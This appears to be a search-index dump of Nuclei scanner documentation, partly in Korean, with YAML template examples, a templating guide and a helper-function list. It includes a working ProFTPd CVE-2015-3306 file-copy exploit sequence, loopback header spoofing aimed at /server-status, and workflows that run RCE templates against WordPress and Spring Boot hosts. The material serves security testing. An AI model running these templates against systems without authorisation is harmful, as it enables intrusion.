dsl dsl : - 'status_code==404'","title":"\ucc28\ub4f1 \uc751\ub2f5 \uae30\ubc18 TE.CL"},{"location":"kr/template-examples/http/","text":"Basic Template \u00b6 This template requests / path of URL and match string in the response. id : basic-example info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers : - type : word words : - \"This is test matcher text\" Multiple matchers \u00b6 This template requests / path of URL and run multiple OR based matchers against response. id : http-multiple-matchers info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" part : header Matchers with conditions \u00b6 This template requests / path of URL and runs two matchers, one with AND conditions with string match in header and another matcher against response body. id : matchers-conditions info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : and part : header - type : word words : - \"PHP\" part : body Multiple matcher conditions \u00b6 This template requests / path of URL and runs two matchers with AND conditions, one with OR conditions with string match in header and another matcher against response body, both condition has to be true in order to match this template. id : multiple-matchers-conditions info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - PHP part : body Custom headers \u00b6 This template requests / path of the URL as GET request with additional custom headers defined in the template. id : custom-headers info : name : Test HTTP Template author : pdteam severity : info http : - method : GET # Example of sending some headers to the servers headers : X-Client-IP : 127.0.0.1 X-Remote-IP : 127.0.0.1 X-Remote-Addr : 127.0.0.1 X-Forwarded-For : 127.0.0.1 X-Originating-IP : 127.0.0.1 path : - \"{{BaseURL}}/server-status\" matchers : - type : word words : - Apache Server Status - Server Version condition : and POST requests \u00b6 This template makes POST request to /admin endpoint with defined data as body parameter in the template. id : post-request info : name : Test HTTP Template author : pdteam severity : info http : - method : POST path : - \"{{BaseURL}}/admin\" body : 'admin=test' matchers : - type : word words : - Welcome Admin Time based Matcher \u00b6 This template is example of DSL based duration matcher that returns true when the response time matched the defined duration, in this case 6 or more than 6 seconds. id : time-based-matcher info : name : DSL based response time matcher author : pdteam severity : none http : - raw : - | GET /slow HTTP/1.1 matchers : - type : dsl dsl : - 'duration>=6'","title":"Http"},{"location":"kr/template-examples/http/#basic-template","text":"This template requests / path of URL and match string in the response. id : basic-example info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers : - type : word words : - \"This is test matcher text\"","title":"Basic Template"},{"location":"kr/template-examples/http/#multiple-matchers","text":"This template requests / path of URL and run multiple OR based matchers against response. id : http-multiple-matchers info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers : - type : word name : php words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" part : header - type : word name : node words : - \"Server: NodeJS\" - \"X-Powered-By: nodejs\" condition : or part : header - type : word name : python words : - \"Python/2.\" - \"Python/3.\" part : header","title":"Multiple matchers"},{"location":"kr/template-examples/http/#matchers-with-conditions","text":"This template requests / path of URL and runs two matchers, one with AND conditions with string match in header and another matcher against response body. id : matchers-conditions info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : and part : header - type : word words : - \"PHP\" part : body","title":"Matchers with conditions"},{"location":"kr/template-examples/http/#multiple-matcher-conditions","text":"This template requests / path of URL and runs two matchers with AND conditions, one with OR conditions with string match in header and another matcher against response body, both condition has to be true in order to match this template. id : multiple-matchers-conditions info : name : Test HTTP Template author : pdteam severity : info http : - method : GET path : - \"{{BaseURL}}\" matchers-condition : and matchers : - type : word words : - \"X-Powered-By: PHP\" - \"PHPSESSID\" condition : or part : header - type : word words : - PHP part : body","title":"Multiple matcher conditions"},{"location":"kr/template-examples/http/#custom-headers","text":"This template requests / path of the URL as GET request with additional custom headers defined in the template. id : custom-headers info : name : Test HTTP Template author : pdteam severity : info http : - method : GET # Example of sending some headers to the servers headers : X-Client-IP : 127.0.0.1 X-Remote-IP : 127.0.0.1 X-Remote-Addr : 127.0.0.1 X-Forwarded-For : 127.0.0.1 X-Originating-IP : 127.0.0.1 path : - \"{{BaseURL}}/server-status\" matchers : - type : word words : - Apache Server Status - Server Version condition : and","title":"Custom headers"},{"location":"kr/template-examples/http/#post-requests","text":"This template makes POST request to /admin endpoint with defined data as body parameter in the template. id : post-request info : name : Test HTTP Template author : pdteam severity : info http : - method : POST path : - \"{{BaseURL}}/admin\" body : 'admin=test' matchers : - type : word words : - Welcome Admin","title":"POST requests"},{"location":"kr/template-examples/http/#time-based-matcher","text":"This template is example of DSL based duration matcher that returns true when the response time matched the defined duration, in this case 6 or more than 6 seconds. id : time-based-matcher info : name : DSL based response time matcher author : pdteam severity : none http : - raw : - | GET /slow HTTP/1.1 matchers : - type : dsl dsl : - 'duration>=6'","title":"Time based Matcher"},{"location":"kr/template-examples/network/","text":"Basic Network Request \u00b6 This template connects to a network service, sends some data and reads 4 bytes from the response. Matchers are run to identify valid response, which in this case is PONG . id : basic-network-request info : name : Basic Network Request author : pdteam severity : info tcp : - host : - \"{{Hostname}}\" inputs : - data : \"PING\\r\\n\" read-size : 4 matchers : - type : word part : data words : - \"PONG\" TLS Network Request \u00b6 Similar to the above template, but the connection to the service is done with TLS enabled. id : basic-tls-network-request info : name : Basic TLS Network Request author : pdteam severity : info tcp : - host : - \"tls://{{Hostname}}\" inputs : - data : \"PING\\r\\n\" read-size : 4 matchers : - type : word part : data words : - \"PONG\" Hex Input Request \u00b6 This template connects to a network service, sends some data encoded in hexadecimal to the server and reads 4 bytes from the response. Matchers are run to identify valid response, which in this case is PONG . The match words here are encoded in Hexadecimal, using encoding: hex option of matchers. id : hex-network-request info : name : Hex Input Network Request author : pdteam severity : info tcp : - host : - \"{{Hostname}}\" inputs : - data : \"50494e47\" type : hex - data : \"\\r\\n\" read-size : 4 matchers : - type : word part : data encoding : hex words : - \"504f4e47\" Input Expressions \u00b6 Inputs specified in network also support DSL Helper Expressions, so you can create your own complex inputs using variety of nuclei helper functions. The below template is an example of using hex_decode function to send decoded input over wire. id : input-expressions-mongodb-detect info : name : Input Expression MongoDB Detection author : pd-team severity : info reference : https://github.com/orleven/Tentacle tcp : - inputs : - data : \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\" host : - \"{{Hostname}}\" read-size : 2048 matchers : - type : word words : - \"logicalSessionTimeout\" - \"localTime\" Multi-Step Requests \u00b6 This last example is an RCE in proFTPd which, if vulnerable, allows placing arbitrary files in any directory on the server. The detection process involves a random string on each nuclei run using {{randstr}} , and sending multiple lines of FTP input to the vulnerable server. At the end, a successful match is detected with the presence of Copy successful in the response. id : CVE-2015-3306 info : name : ProFTPd RCE author : pd-team severity : high reference : https://github.com/t0kx/exploit-CVE-2015-3306 tags : cve,cve2015,ftp,rce tcp : - inputs : - data : \"site cpfr /proc/self/cmdline\\r\\n\" read : 1024 - data : \"site cpto /tmp/.{{randstr}}\\r\\n\" read : 1024 - data : \"site cpfr /tmp/.{{randstr}}\\r\\n\" read : 1024 - data : \"site cpto /var/www/html/{{randstr}}\\r\\n\" host : - \"{{Hostname}}\" read-size : 1024 matchers : - type : word words : - \"Copy successful\"","title":"Network"},{"location":"kr/template-examples/network/#basic-network-request","text":"This template connects to a network service, sends some data and reads 4 bytes from the response. Matchers are run to identify valid response, which in this case is PONG . id : basic-network-request info : name : Basic Network Request author : pdteam severity : info tcp : - host : - \"{{Hostname}}\" inputs : - data : \"PING\\r\\n\" read-size : 4 matchers : - type : word part : data words : - \"PONG\"","title":"Basic Network Request"},{"location":"kr/template-examples/network/#tls-network-request","text":"Similar to the above template, but the connection to the service is done with TLS enabled. id : basic-tls-network-request info : name : Basic TLS Network Request author : pdteam severity : info tcp : - host : - \"tls://{{Hostname}}\" inputs : - data : \"PING\\r\\n\" read-size : 4 matchers : - type : word part : data words : - \"PONG\"","title":"TLS Network Request"},{"location":"kr/template-examples/network/#hex-input-request","text":"This template connects to a network service, sends some data encoded in hexadecimal to the server and reads 4 bytes from the response. Matchers are run to identify valid response, which in this case is PONG . The match words here are encoded in Hexadecimal, using encoding: hex option of matchers. id : hex-network-request info : name : Hex Input Network Request author : pdteam severity : info tcp : - host : - \"{{Hostname}}\" inputs : - data : \"50494e47\" type : hex - data : \"\\r\\n\" read-size : 4 matchers : - type : word part : data encoding : hex words : - \"504f4e47\"","title":"Hex Input Request"},{"location":"kr/template-examples/network/#input-expressions","text":"Inputs specified in network also support DSL Helper Expressions, so you can create your own complex inputs using variety of nuclei helper functions. The below template is an example of using hex_decode function to send decoded input over wire. id : input-expressions-mongodb-detect info : name : Input Expression MongoDB Detection author : pd-team severity : info reference : https://github.com/orleven/Tentacle tcp : - inputs : - data : \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\" host : - \"{{Hostname}}\" read-size : 2048 matchers : - type : word words : - \"logicalSessionTimeout\" - \"localTime\"","title":"Input Expressions"},{"location":"kr/template-examples/network/#multi-step-requests","text":"This last example is an RCE in proFTPd which, if vulnerable, allows placing arbitrary files in any directory on the server. The detection process involves a random string on each nuclei run using {{randstr}} , and sending multiple lines of FTP input to the vulnerable server. At the end, a successful match is detected with the presence of Copy successful in the response. id : CVE-2015-3306 info : name : ProFTPd RCE author : pd-team severity : high reference : https://github.com/t0kx/exploit-CVE-2015-3306 tags : cve,cve2015,ftp,rce tcp : - inputs : - data : \"site cpfr /proc/self/cmdline\\r\\n\" read : 1024 - data : \"site cpto /tmp/.{{randstr}}\\r\\n\" read : 1024 - data : \"site cpfr /tmp/.{{randstr}}\\r\\n\" read : 1024 - data : \"site cpto /var/www/html/{{randstr}}\\r\\n\" host : - \"{{Hostname}}\" read-size : 1024 matchers : - type : word words : - \"Copy successful\"","title":"Multi-Step Requests"},{"location":"kr/template-examples/workflow/","text":"Generic workflows \u00b6 A generic workflow that runs two templates, one to detect Jira and another to detect Confluence. id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : technologies/jira-detect.yaml - template : technologies/confluence-detect.yaml Basic conditional workflows \u00b6 A condition based workflow, which first tries to detect if springboot is running on a target. If springboot is found, a list of exploits executed against it. id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : security-misconfiguration/springboot-detect.yaml subtemplates : - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2020-5410.yaml - template : vulnerabilities/springboot-actuators-jolokia-xxe.yaml - template : vulnerabilities/springboot-h2-db-rce.yaml Multi condition workflows \u00b6 This template demonstrates nested workflows with nuclei, where there's multiple levels of chaining of templates. id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml Conditional workflows with matcher \u00b6 This template detects if WordPress is running on an input host, and if found a set of targeted exploits and CVEs are executed against it. id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml matchers : - name : wordpress subtemplates : - template : cves/CVE-2019-6715.yaml - template : cves/CVE-2019-9978.yaml - template : files/wordpress-db-backup.yaml - template : files/wordpress-debug-log.yaml - template : files/wordpress-directory-listing.yaml - template : files/wordpress-emergency-script.yaml - template : files/wordpress-installer-log.yaml - template : files/wordpress-tmm-db-migrate.yaml - template : files/wordpress-user-enumeration.yaml - template : security-misconfiguration/wordpress-accessible-wpconfig.yaml - template : vulnerabilities/sassy-social-share.yaml - template : vulnerabilities/w3c-total-cache-ssrf.yaml - template : vulnerabilities/wordpress-duplicator-path-traversal.yaml - template : vulnerabilities/wordpress-social-metrics-tracker.yaml - template : vulnerabilities/wordpress-wordfence-xss.yaml - template : vulnerabilities/wordpress-wpcourses-info-disclosure.yaml Multiple Matcher workflow \u00b6 Very similar to the last example, with multiple matcher names. id : workflow-multiple-matcher info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml matchers : - name : vbulletin subtemplates : - tags : vbulletin - name : jboss subtemplates : - tags : jboss","title":"Workflow"},{"location":"kr/template-examples/workflow/#generic-workflows","text":"A generic workflow that runs two templates, one to detect Jira and another to detect Confluence. id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : technologies/jira-detect.yaml - template : technologies/confluence-detect.yaml","title":"Generic workflows"},{"location":"kr/template-examples/workflow/#basic-conditional-workflows","text":"A condition based workflow, which first tries to detect if springboot is running on a target. If springboot is found, a list of exploits executed against it. id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : security-misconfiguration/springboot-detect.yaml subtemplates : - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2018-1271.yaml - template : cves/CVE-2020-5410.yaml - template : vulnerabilities/springboot-actuators-jolokia-xxe.yaml - template : vulnerabilities/springboot-h2-db-rce.yaml","title":"Basic conditional workflows"},{"location":"kr/template-examples/workflow/#multi-condition-workflows","text":"This template demonstrates nested workflows with nuclei, where there's multiple levels of chaining of templates. id : springboot-workflow info : name : Springboot Security Checks author : dwisiswant0 workflows : - template : technologies/tech-detect.yaml matchers : - name : lotus-domino subtemplates : - template : technologies/lotus-domino-version.yaml subtemplates : - template : cves/xx-yy-zz.yaml subtemplates : - template : cves/xx-xx-xx.yaml","title":"Multi condition workflows"},{"location":"kr/template-examples/workflow/#conditional-workflows-with-matcher","text":"This template detects if WordPress is running on an input host, and if found a set of targeted exploits and CVEs are executed against it. id : workflow-example info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml matchers : - name : wordpress subtemplates : - template : cves/CVE-2019-6715.yaml - template : cves/CVE-2019-9978.yaml - template : files/wordpress-db-backup.yaml - template : files/wordpress-debug-log.yaml - template : files/wordpress-directory-listing.yaml - template : files/wordpress-emergency-script.yaml - template : files/wordpress-installer-log.yaml - template : files/wordpress-tmm-db-migrate.yaml - template : files/wordpress-user-enumeration.yaml - template : security-misconfiguration/wordpress-accessible-wpconfig.yaml - template : vulnerabilities/sassy-social-share.yaml - template : vulnerabilities/w3c-total-cache-ssrf.yaml - template : vulnerabilities/wordpress-duplicator-path-traversal.yaml - template : vulnerabilities/wordpress-social-metrics-tracker.yaml - template : vulnerabilities/wordpress-wordfence-xss.yaml - template : vulnerabilities/wordpress-wpcourses-info-disclosure.yaml","title":"Conditional workflows with matcher"},{"location":"kr/template-examples/workflow/#multiple-matcher-workflow","text":"Very similar to the last example, with multiple matcher names. id : workflow-multiple-matcher info : name : Test Workflow Template author : pdteam workflows : - template : technologies/tech-detect.yaml matchers : - name : vbulletin subtemplates : - tags : vbulletin - name : jboss subtemplates : - tags : jboss","title":"Multiple Matcher workflow"},{"location":"kr/templating-guide/","text":"Templating Guide \u00b6 **Nuclei**\ub294 request\ub97c \ubcf4\ub0b4\uace0 \ucc98\ub9ac\ud558\uae30 \uc704\ud574 YAML \uae30\ubc18 \ud15c\ud50c\ub9bf \ud30c\uc77c\uc758 \ucee8\uc149\uc744 \uae30\ubc18\uc73c\ub85c \ud569\ub2c8\ub2e4. \uc774\ub97c \ud1b5\ud574 nuclei\ub85c \uc27d\uac8c \ud655\uc7a5\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud15c\ud50c\ub9bf\uc740 \uc2e4\ud589 \ud504\ub85c\uc138\uc2a4\ub97c \ube60\ub974\uac8c \uc815\uc758\ud558\uae30 \uc704\ud574 \uc0ac\ub78c\uc774 \uc77d\uc744 \uc218 \uc788\ub294 \uac04\ub2e8\ud55c \ud615\uc2dd\uc758 YAML \ub85c \uc791\uc131\ub418\uc5c8\uc2b5\ub2c8\ub2e4. nuclei \ud15c\ud50c\ub9bf \uc9c1\uc811 \uc791\uc131\uc744 \uc704\ud55c \uac00\uc774\ub4dc - \ud15c\ud50c\ub9bf \uc138\ubd80 \uc815\ubcf4 \u00b6 \uac01 \ud15c\ud50c\ub9bf\uc5d0\ub294 \ucd9c\ub825 \ub77c\uc778\uc5d0 \ub300\ud55c \ud15c\ud50c\ub9bf \uc774\ub984\uc744 \uc9c0\uc815\ud558\uae30 \uc704\ud574 \ucd9c\ub825 \uc790\uc131 \uc911\uc5d0 \uc0ac\uc6a9\ub418\ub294 \uace0\uc720 ID\uac00 \uc788\uc2b5\ub2c8\ub2e4. \ud15c\ud50c\ub9bf \ud30c\uc77c\uc740 YAML \ud655\uc7a5\uc790\ub85c \ub05d\ub0a9\ub2c8\ub2e4. \ud15c\ud50c\ub9bf \ud30c\uc77c\uc740 \uc6d0\ud558\ub294 \ud14d\uc2a4\ud2b8 \ud3b8\uc9d1\uae30\ub85c \ub9cc\ub4e4 \uc218 \uc788\uc2b5\ub2c8\ub2e4. id : git-config ID\ub294 \uacf5\ubc31\uc744 \ud3ec\ud568\ud560 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4. \uc774\uac83\uc740 \ub354 \uc26c\uc6b4 \ucd9c\ub825 \uad6c\ubb38 \ubd84\uc11d\uc744 \ud5c8\uc6a9\ud558\uae30 \uc704\ud574 \uc218\ud589\ub429\ub2c8\ub2e4. Information \u00b6 \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \ub2e4\uc74c\uc73c\ub85c \uc911\uc694\ud55c \uc815\ubcf4\ub294 info \ube14\ub85d\uc785\ub2c8\ub2e4. Info \ube14\ub85d\uc740 name , author , severity , description , reference \ubc0f tags**\ub97c \uc81c\uacf5\ud569\ub2c8\ub2e4. \ub610\ud55c \ud15c\ud50c\ub9bf\uc758 \uc2ec\uac01\ub3c4\ub97c \ub098\ud0c0\ub0b4\ub294 **severity \ud544\ub4dc\uac00 \ud3ec\ud568\ub418\uc5b4 \uc788\uc73c\uba70, info \ube14\ub85d\uc740 \ub3d9\uc801 \ud544\ub4dc\ub3c4 \uc9c0\uc6d0\ud558\ubbc0\ub85c N \uac1c\uc758 key: value \ube14\ub85d\uc744 \uc815\uc758\ud558\uc5ec \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \ubcf4\ub2e4 \uc720\uc6a9\ud55c \uc815\ubcf4\ub97c \uc81c\uacf5\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. info \ube14\ub85d\uc5d0 \ud56d\uc0c1 \ucd94\uac00\ud560 \uc218 \uc788\ub294 \ub610 \ub2e4\ub978 \uc720\uc6a9\ud55c \ud0dc\uadf8\ub294 tags \uc785\ub2c8\ub2e4. \uc774\ub97c \ud1b5\ud574 cve , rce \ub4f1\uacfc \uac19\uc740 \ubaa9\uc801\uc5d0 \ub530\ub77c \uc77c\ubd80 \uc0ac\uc6a9\uc790 \uc815\uc758 \ud0dc\uadf8\ub97c \ud15c\ud50c\ub9bf\uc5d0 \uc124\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc774\ub97c \ud1b5\ud574 nuclei\ub294 \uc785\ub825 \ud0dc\uadf8\uac00 \uc788\ub294 \ud15c\ud50c\ub9bf\ub9cc\uc744 \uc2dd\ubcc4\ud558\uace0 \uc2e4\ud589\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. info block \uc608\uc2dc - info : name : Git Config File Detection Template author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. reference : https://www.acunetix.com/vulnerabilities/web/git-repository-found/ tags : git,config \uc2e4\uc81c requests \ubc0f \ud574\ub2f9\ub418\ub294 matchers\ub294 info block \uc544\ub798\uc5d0 \uc704\uce58\ud558\uba70, \ub300\uc0c1 \uc11c\ubc84\uc5d0 request\ub97c \ub9cc\ub4e4\uace0 \ud15c\ud50c\ub9bf request\uac00 \uc131\uacf5\ud588\ub294\uc9c0 \ud655\uc778\ud558\ub294 \uc791\uc5c5\uc744 \uc218\ud589\ud569\ub2c8\ub2e4. \uac01 \ud15c\ud50c\ub9bf \ud30c\uc77c\uc5d0\ub294 \uc218\ud589\ud560 \uc5ec\ub7ec request\ub4e4\uc774 \ud3ec\ud568\ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud15c\ud50c\ub9bf\uc774 \ubc18\ubcf5\ub418\uba74\uc11c \uc6d0\ud558\ub294 request\uac00 \ub300\uc0c1 \uc0ac\uc774\ud2b8\uc5d0 \ud558\ub098\uc529 \ub9cc\ub4e4\uc5b4\uc9d1\ub2c8\ub2e4. \uc774\uac83\uc758 \uac00\uc7a5 \uc88b\uc740 \uc810\uc740 \uc81c\uc791\ub41c \ud15c\ud50c\ub9bf\uc744 \ud300\uc6d0, \ubd84\ub958/\ubcf4\uc548 \ud300\uacfc \uac04\ub2e8\ud788 \uacf5\uc720\ud558\uc5ec \ub2e4\ub978 \ucabd\uc5d0\uc11c \ubb38\uc81c\ub97c \uc27d\uac8c \ubcf5\uc81c\ud560 \uc218 \uc788\ub2e4\ub294 \uc810\uc785\ub2c8\ub2e4.","title":"Templating Guide"},{"location":"kr/templating-guide/#templating-guide","text":"**Nuclei**\ub294 request\ub97c \ubcf4\ub0b4\uace0 \ucc98\ub9ac\ud558\uae30 \uc704\ud574 YAML \uae30\ubc18 \ud15c\ud50c\ub9bf \ud30c\uc77c\uc758 \ucee8\uc149\uc744 \uae30\ubc18\uc73c\ub85c \ud569\ub2c8\ub2e4. \uc774\ub97c \ud1b5\ud574 nuclei\ub85c \uc27d\uac8c \ud655\uc7a5\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud15c\ud50c\ub9bf\uc740 \uc2e4\ud589 \ud504\ub85c\uc138\uc2a4\ub97c \ube60\ub974\uac8c \uc815\uc758\ud558\uae30 \uc704\ud574 \uc0ac\ub78c\uc774 \uc77d\uc744 \uc218 \uc788\ub294 \uac04\ub2e8\ud55c \ud615\uc2dd\uc758 YAML \ub85c \uc791\uc131\ub418\uc5c8\uc2b5\ub2c8\ub2e4. nuclei \ud15c\ud50c\ub9bf \uc9c1\uc811 \uc791\uc131\uc744 \uc704\ud55c \uac00\uc774\ub4dc -","title":"Templating Guide"},{"location":"kr/templating-guide/#_1","text":"\uac01 \ud15c\ud50c\ub9bf\uc5d0\ub294 \ucd9c\ub825 \ub77c\uc778\uc5d0 \ub300\ud55c \ud15c\ud50c\ub9bf \uc774\ub984\uc744 \uc9c0\uc815\ud558\uae30 \uc704\ud574 \ucd9c\ub825 \uc790\uc131 \uc911\uc5d0 \uc0ac\uc6a9\ub418\ub294 \uace0\uc720 ID\uac00 \uc788\uc2b5\ub2c8\ub2e4. \ud15c\ud50c\ub9bf \ud30c\uc77c\uc740 YAML \ud655\uc7a5\uc790\ub85c \ub05d\ub0a9\ub2c8\ub2e4. \ud15c\ud50c\ub9bf \ud30c\uc77c\uc740 \uc6d0\ud558\ub294 \ud14d\uc2a4\ud2b8 \ud3b8\uc9d1\uae30\ub85c \ub9cc\ub4e4 \uc218 \uc788\uc2b5\ub2c8\ub2e4. id : git-config ID\ub294 \uacf5\ubc31\uc744 \ud3ec\ud568\ud560 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4. \uc774\uac83\uc740 \ub354 \uc26c\uc6b4 \ucd9c\ub825 \uad6c\ubb38 \ubd84\uc11d\uc744 \ud5c8\uc6a9\ud558\uae30 \uc704\ud574 \uc218\ud589\ub429\ub2c8\ub2e4.","title":"\ud15c\ud50c\ub9bf \uc138\ubd80 \uc815\ubcf4"},{"location":"kr/templating-guide/#information","text":"\ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \ub2e4\uc74c\uc73c\ub85c \uc911\uc694\ud55c \uc815\ubcf4\ub294 info \ube14\ub85d\uc785\ub2c8\ub2e4. Info \ube14\ub85d\uc740 name , author , severity , description , reference \ubc0f tags**\ub97c \uc81c\uacf5\ud569\ub2c8\ub2e4. \ub610\ud55c \ud15c\ud50c\ub9bf\uc758 \uc2ec\uac01\ub3c4\ub97c \ub098\ud0c0\ub0b4\ub294 **severity \ud544\ub4dc\uac00 \ud3ec\ud568\ub418\uc5b4 \uc788\uc73c\uba70, info \ube14\ub85d\uc740 \ub3d9\uc801 \ud544\ub4dc\ub3c4 \uc9c0\uc6d0\ud558\ubbc0\ub85c N \uac1c\uc758 key: value \ube14\ub85d\uc744 \uc815\uc758\ud558\uc5ec \ud15c\ud50c\ub9bf\uc5d0 \ub300\ud55c \ubcf4\ub2e4 \uc720\uc6a9\ud55c \uc815\ubcf4\ub97c \uc81c\uacf5\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. info \ube14\ub85d\uc5d0 \ud56d\uc0c1 \ucd94\uac00\ud560 \uc218 \uc788\ub294 \ub610 \ub2e4\ub978 \uc720\uc6a9\ud55c \ud0dc\uadf8\ub294 tags \uc785\ub2c8\ub2e4. \uc774\ub97c \ud1b5\ud574 cve , rce \ub4f1\uacfc \uac19\uc740 \ubaa9\uc801\uc5d0 \ub530\ub77c \uc77c\ubd80 \uc0ac\uc6a9\uc790 \uc815\uc758 \ud0dc\uadf8\ub97c \ud15c\ud50c\ub9bf\uc5d0 \uc124\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc774\ub97c \ud1b5\ud574 nuclei\ub294 \uc785\ub825 \ud0dc\uadf8\uac00 \uc788\ub294 \ud15c\ud50c\ub9bf\ub9cc\uc744 \uc2dd\ubcc4\ud558\uace0 \uc2e4\ud589\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. info block \uc608\uc2dc - info : name : Git Config File Detection Template author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. reference : https://www.acunetix.com/vulnerabilities/web/git-repository-found/ tags : git,config \uc2e4\uc81c requests \ubc0f \ud574\ub2f9\ub418\ub294 matchers\ub294 info block \uc544\ub798\uc5d0 \uc704\uce58\ud558\uba70, \ub300\uc0c1 \uc11c\ubc84\uc5d0 request\ub97c \ub9cc\ub4e4\uace0 \ud15c\ud50c\ub9bf request\uac00 \uc131\uacf5\ud588\ub294\uc9c0 \ud655\uc778\ud558\ub294 \uc791\uc5c5\uc744 \uc218\ud589\ud569\ub2c8\ub2e4. \uac01 \ud15c\ud50c\ub9bf \ud30c\uc77c\uc5d0\ub294 \uc218\ud589\ud560 \uc5ec\ub7ec request\ub4e4\uc774 \ud3ec\ud568\ub420 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ud15c\ud50c\ub9bf\uc774 \ubc18\ubcf5\ub418\uba74\uc11c \uc6d0\ud558\ub294 request\uac00 \ub300\uc0c1 \uc0ac\uc774\ud2b8\uc5d0 \ud558\ub098\uc529 \ub9cc\ub4e4\uc5b4\uc9d1\ub2c8\ub2e4. \uc774\uac83\uc758 \uac00\uc7a5 \uc88b\uc740 \uc810\uc740 \uc81c\uc791\ub41c \ud15c\ud50c\ub9bf\uc744 \ud300\uc6d0, \ubd84\ub958/\ubcf4\uc548 \ud300\uacfc \uac04\ub2e8\ud788 \uacf5\uc720\ud558\uc5ec \ub2e4\ub978 \ucabd\uc5d0\uc11c \ubb38\uc81c\ub97c \uc27d\uac8c \ubcf5\uc81c\ud560 \uc218 \uc788\ub2e4\ub294 \uc810\uc785\ub2c8\ub2e4.","title":"Information"},{"location":"kr/templating-guide/helper-functions/","text":"Helper functions \u00b6 \ub2e4\uc74c\uc740 RAW requests / Network requests\uc5d0\uc11c \uc9c0\uc6d0\ub418\ub294 \ubaa8\ub4e0 helper function\uc758 \ubaa9\ub85d\uc785\ub2c8\ub2e4. Helper function Description Example Output aes_gcm(key, plaintext interface{}) key\ub85c \ubb38\uc790\uc5f4\uc744 AES GCM \uc554\ud638\ud654\ud569\ub2c8\ub2e4. {{hex_encode(aes_gcm(\"AES256Key-32Characters1234567890\", \"exampleplaintext\"))}} ec183a153b8e8ae7925beed74728534b57a60920c0b009eaa7608a34e06325804c096d7eebccddea3e5ed6c4 base64(src interface{}) string \ubb38\uc790\uc5f4\uc744 Base64\ub85c \uc778\ucf54\ub529\ud569\ub2c8\ub2e4. base64(\"Hello\") SGVsbG8= base64_decode(src interface{}) []byte \ubb38\uc790\uc5f4\uc744 Base64\ub85c \ub514\ucf54\ub529\ud569\ub2c8\ub2e4. base64_decode(\"SGVsbG8=\") Hello base64_py(src interface{}) string python\ucc98\ub7fc \ubb38\uc790\uc5f4\uc744 base64\ub85c \uc778\ucf54\ub529\ud569\ub2c8\ub2e4. (new lines \ud3ec\ud568) base64_py(\"Hello\") SGVsbG8= concat(arguments ...interface{}) string \uc8fc\uc5b4\uc9c4 \ub9e4\uac1c\ubcc0\uc218\ub4e4\uc744 \ud558\ub098\uc758 \ubb38\uc790\uc5f4\ub85c \ud569\uce69\ub2c8\ub2e4. concat(\"Hello\", 123, \"world) Hello123world compare_versions(versionToCheck string, constraints ...string) bool \uccab \ubc88\uc9f8 \ub9e4\uac1c\ubcc0\uc218\ub85c \ub4e4\uc5b4\uc628 \ubc84\uc804 \uc815\ubcf4\ub97c \uc8fc\uc5b4\uc9c4 \uc81c\uc57d \uc870\uac74\uacfc \ube44\uad50\ud569\ub2c8\ub2e4. compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1') true contains(input, substring interface{}) bool \ubb38\uc790\uc5f4\uc5d0 \ubd80\ubd84 \ubb38\uc790\uc5f4\uc774 \ud3ec\ud568\ub418\uc5b4 \uc788\ub294\uc9c0 \ud655\uc778\ud569\ub2c8\ub2e4. contains(\"Hello\", \"lo\") true generate_java_gadget(gadget, cmd, encoding interface{}) string Java Deserialization 